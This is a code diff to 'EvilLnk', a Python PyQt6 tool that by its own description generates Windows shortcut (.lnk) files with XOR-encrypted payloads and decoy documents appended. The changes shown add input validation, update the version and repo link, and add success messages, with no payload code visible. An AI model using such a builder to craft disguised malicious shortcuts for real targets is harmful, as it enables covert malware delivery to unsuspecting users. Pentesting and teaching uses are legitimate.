@@ -9,7 +9,7 @@ import re
 import os
 import base64
 from datetime import datetime
-from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout,QRadioButton,QButtonGroup, QLineEdit, QPushButton, QTextEdit, QMessageBox, QComboBox, QFileDialog, QMenuBar, QFormLayout
+from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout,QRadioButton,QButtonGroup, QLineEdit, QPushButton, QTextEdit, QMessageBox, QComboBox, QFileDialog, QMenuBar
 from PyQt6.QtCore import QObject, Qt
 from PyQt6.QtGui import QIcon, QAction, QPixmap
 
@@ -287,7 +287,6 @@ class MainWindow(QWidget):
         self.setWindowTitle("EvilLnk")
         self.setWindowIcon(QIcon("img/evillnk.png"))
         self.layout = QVBoxLayout()
-        form_layout = QFormLayout()
         
         self.menu_bar = QMenuBar()
         self.layout.setMenuBar(self.menu_bar)
@@ -421,10 +420,10 @@ class MainWindow(QWidget):
         self.setLayout(self.layout)
 
     def homepage(self):
-        QMessageBox.about(self, "Homepage", "evillnk Github repo:\n\nhttps://github.com/v1kkz/evillnk")
+        QMessageBox.about(self, "Homepage", "evillnk Github repo:\n\nhttps://github.com/d1mov/evillnk")
 
     def about(self):
-        QMessageBox.about(self, "About", "evillnk 1.0\n\nPython GUI based tool to generate lnk files with a payload and decoy files embedded inside.\nIt takes payload file and decoy file as input, converts them to xor encrypted bytes and append them at the end of the lnk file.\n\nTo be used for pentesting or educational purposes only.\n\nCoded by: v1k (Radostin Dimov)")
+        QMessageBox.about(self, "About", "evillnk 1.1\n\nPython GUI based tool to generate lnk files with a payload and decoy files embedded inside.\nIt takes payload file and decoy file as input, converts them to xor encrypted bytes and append them at the end of the lnk file.\n\nTo be used for pentesting or educational purposes only.\n\nCoded by: v1k (Radostin Dimov)")
         
     def handle_payload_type_change(self, index):
         payload_type = self.payload_type_input.currentText()
@@ -461,12 +460,22 @@ class MainWindow(QWidget):
         global lnkfilename
         payload_type = self.payload_type_input.currentText()
         payload_file_input = self.payload_file_input.text()
+        decoy_file_input = self.decoy_file_input.text()
         if not payload_file_input:
             self.console.append("[*] No Payload File Specified!")
             return
-        decoy_file_input = self.decoy_file_input.text()
+        if not os.path.isfile(payload_file_input):
+            self.console.append("[*] Specified Payload File does not exist!")
+            return
+        valid_extensions = ('.ps1', '.exe', '.dll')
+        if not payload_file_input.lower().endswith(valid_extensions):
+            self.console.append("[*] Unsupported payload file type!")
+            return
         if not decoy_file_input:
             self.console.append("[*] No Decoy File Specified!")
+            return
+        if not os.path.isfile(decoy_file_input):
+            self.console.append("[*] Specified Decoy File does not exist!")
             return
         dll_ep = self.dll_entrypoint_input.text()
         decoyname = os.path.basename(decoy_file_input)
@@ -590,13 +599,15 @@ class MainWindow(QWidget):
             subprocess.run(['rm', lnkfilename])
             output_file, _ = QFileDialog.getSaveFileName(self, "Save Output File", 'example.lnk', "lnk Files (*.lnk)")
             if output_file:
-                with open(output_file, 'wb') as output_file:
-                    output_file.write(lnkfilecontent)
+                with open(output_file, 'wb') as saved_file:
+                    saved_file.write(lnkfilecontent)
+            self.console.append("[*] Cleaning Up...")
             subprocess.run(['rm', 'decoy_enc'])
             if payload_type != "PowerShell Script":
                 subprocess.run(['rm', 'payload_enc'])
             subprocess.run(['rm', 'loader_enc'])
-            self.console.append(f"[*] Done! Lnk file saved!")
+            self.console.append(f"[*] Done! Lnk file saved to {output_file}")
+            QMessageBox.about(self, "Success!", "Success! Lnk file generated and saved!")
         
         except ValueError as e:
             self.console.append(f"Error: {e}")
